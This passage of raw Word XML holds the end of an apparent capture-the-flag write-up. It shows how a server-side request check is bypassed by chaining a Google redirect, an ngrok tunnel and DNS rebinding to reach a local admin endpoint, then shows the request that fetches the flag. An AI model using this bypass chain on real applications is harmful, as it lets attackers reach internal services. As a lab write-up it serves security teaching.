          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>": "https://www.google.com/url?q=https://f82e-196-153-112-10.ngrok-free.app&amp;source=gmail&amp;ust=1749640028092000&amp;usg=AOvVaw3SumcNqTsz0hJeDYCm4Uei"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F4C748" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The application checks:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398DEDA6" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Host is www.google.co</w:t>
      </w:r>
      <w:r>
        <w:t>m ✓</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E2D7A4" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Google redirects to our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ngrok</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> domain ✓</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D777C5A" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Ngrok</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> domain resolves to public IP ✓</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BEA775D" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Ngrok</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> redirects to DNS rebinding domain ✓</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF20F7C" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>DNS domain initially resolves to public IP (if we're lucky) ✓</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D490D0B" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>DNS rebinding takes effect:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268648B9" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>If we're lucky with the timing, after checks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are completed, the DNS rebinding domain resolves to 127.0.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A0A013" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The final </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>requests.get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> call follows all redirects to http://127.0.0.1/admin?nickname=x</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1529BB97" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The admin endpoint sets the flag to SHA256(x)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D0E5CA7" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>Since the DNS rebinding service alternates randomly, we</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> may need to try multiple times until we get the right sequence of IP resolutions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0579D7" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>6. Retrieving the Flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1FFAA9" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>Finally, we can retrieve the flag:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DFD8CC" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>POST /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>flag?nickname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=x</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438CD4D0" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>Response:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCD0D14" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>flag{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stigmata_stigmata_stigmata</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317B5FC1" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00EC35E6"/>
    <w:sectPr w:rsidR="00EC35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auto"/>
    <w:pitch w:val="default"/>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78E3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CD026DA2"/>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D3C5846"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5B0E87E4"/>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45A6CE4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8346BBBE"/>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24D65BA8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="FB84B948"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" "/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" "/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" "/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Noto Sans Symbols" w:eastAsia="Noto Sans Symbols" w:hAnsi="Noto Sans Symbols" w:cs="Noto Sans Symbols"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" "/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Noto Sans Symbols" w:eastAsia="Noto Sans Symbols" w:hAnsi="Noto Sans Symbols" w:cs="Noto Sans Symbols"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" "/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" "/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Noto Sans Symbols" w:eastAsia="Noto Sans Symbols" w:hAnsi="Noto Sans Symbols" w:cs="Noto Sans Symbols"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" "/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Noto Sans Symbols" w:eastAsia="Noto Sans Symbols" w:hAnsi="Noto Sans Symbols" w:cs="Noto Sans Symbols"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" "/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=" "/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Noto Sans Symbols" w:eastAsia="Noto Sans Symbols" w:hAnsi="Noto Sans Symbols" w:cs="Noto Sans Symbols"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="27354725"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3106151C"/>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384323CF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="FEB62D32"/>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67C53BE9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2C809066"/>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6BE50DB1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E340A6EC"/>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2"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="1"/>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5E6"/>
    <w:rsid w:val="00406513"/>
    <w:rsid w:val="00730AB9"/>
    <w:rsid w:val="00EC35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E48A"/>
  <w15:docId w15:val="{6CB38330-73EB-4740-95B9-5ECAD91F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uiPriority w:val="9"/>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unhideWhenUsed/>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unhideWhenUsed/>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uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00EF7B96"/>
    <w:pPr>
      <w:keepNext/>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Quote">
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QuoteChar"/>
    <w:uiPriority w:val="29"/>
    <w:qFormat/>
    <w:rsid w:val="00E12ACB"/>
    <w:pPr>
      <w:pBdr>
        <w:left w:val="single" w:sz="18" w:space="0" w:color="9F9F9F"/>
      </w:pBdr>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QuoteChar">
    <w:name w:val="Quote Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Quote"/>
    <w:uiPriority w:val="29"/>
    <w:rsid w:val="00E12ACB"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCodepython">
    <w:name w:val="FencedCode.python"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="InlineCode">
    <w:name w:val="InlineCode"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:color w:val="C7254E"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:highlight w:val="white"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCode">
    <w:name w:val="FencedCode"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00EF7B96"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FencedCodebash">
    <w:name w:val="FencedCode.bash"/>
    <w:pPr>
      <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00DC4436"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleEmphasis">
    <w:name w:val="Subtle Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="19"/>
    <w:qFormat/>
    <w:rsid w:val="00DC4436"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00BA692C"/>
    <w:pPr>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ock.cmpxchg8b.com/rebinder.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ock.cmpxchg8b.com/rebind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rivacy-wise.com/dont-trust-google-link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google.com/url?sa=t&amp;source=web&amp;rct=j&amp;opi=89978449&amp;url=https://example.com/&amp;ved=2ahUKEwjZkcPwrOeNAxWoxQIHHXtkIRkQFnoECDgQAQ&amp;usg=AOvVaw1ZdjnOEOwQMqBbQma6rz2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aVimHgjOFI2rgOGxUhPIexTa1Q==">CgMxLjA4AHIhMU16d0FaNVItNldXYkRtRkZ1bVQ0VVNuUjl2RGtkbldS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1739</Words>
  <Characters>9918</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>82</Lines>
  <Paragraphs>23</Paragraphs>
  <ScaleCrop>false</ScaleCrop>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Ashraf Ismail Saad Ismail</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-06-10T17:07:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-07-21T20:05:00Z</dcterms:modified>
</cp:coreProperties>
</file>